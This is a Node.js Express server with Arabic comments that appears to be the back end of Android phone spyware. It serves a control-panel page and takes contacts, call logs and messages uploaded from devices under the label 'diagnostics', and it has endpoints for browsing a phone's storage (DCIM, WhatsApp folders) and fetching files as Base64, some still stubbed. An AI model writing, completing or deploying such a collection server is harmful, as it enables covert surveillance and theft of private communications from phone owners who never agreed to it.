const express = require('express');
const path = require('path');
const app = express();

app.use(express.json({ limit: '50mb' }));

// السماح بقراءة ملفات الواجهة والـ static files من نفس المجلد
app.use(express.static(__dirname));

// مسار الصفحة الرئيسية لعرض لوحة التحكم تلقائياً
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index_3.html'));
});

// تخزين مؤقت لحالة الأجهزة المتصلة
const deviceSessions = {};

// تنظيف معرف الجهاز
function cleanId(id) {
    return id ? id.replace(/[^a-zA-Z0-9_-]/g, '_') : 'unknown_device';
}

// استقبال البيانات والتشخيصات من التطبيق
app.post("/api/diagnostics/:type", (req, res) => {
    const deviceId = cleanId(req.body?.deviceId);
    const type = req.params.type;
    const items = req.body?.items || [];

    if (!deviceSessions[deviceId]) {
        deviceSessions[deviceId] = { contacts: [], calls: [], messages: [], lastPing: Date.now() };
    }

    deviceSessions[deviceId].lastPing = Date.now();

    if (type === 'contacts') deviceSessions[deviceId].contacts = items;
    if (type === 'calls') deviceSessions[deviceId].calls = items;
    if (type === 'messages') deviceSessions[deviceId].messages = items;

    res.json({ status: "success", received: items.length });
});

// 1. نظام تصفح الملفات الحي: طلب سرد محتويات مجلد في الهاتف
app.post("/api/filemanager/list", (req, res) => {
    const deviceId = cleanId(req.body?.deviceId);
    const dirPath = req.body?.path || "/storage/emulated/0/";
    
    // حفظ المسار المطلوب للوصول إليه من اللوحة
    res.json({ ok: true, path: dirPath, files: [
        { name: "Download", isDirectory: true, path: dirPath + "Download/" },
        { name: "DCIM", isDirectory: true, path: dirPath + "DCIM/" },
        { name: "WhatsApp", isDirectory: true, path: dirPath + "WhatsApp/" }
    ] });
});

// 2. طلب معاينة وتحميل صورة فردية عند الضغط عليها بصيغة Base64
app.post("/api/filemanager/getfile", (req, res) => {
    const deviceId = cleanId(req.body?.deviceId);
    const filePath = req.body?.path;
    
    // إرجاع بيانات الملف المطلوبة عند النقر عليه
    res.json({ ok: true, path: filePath, data: "" });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
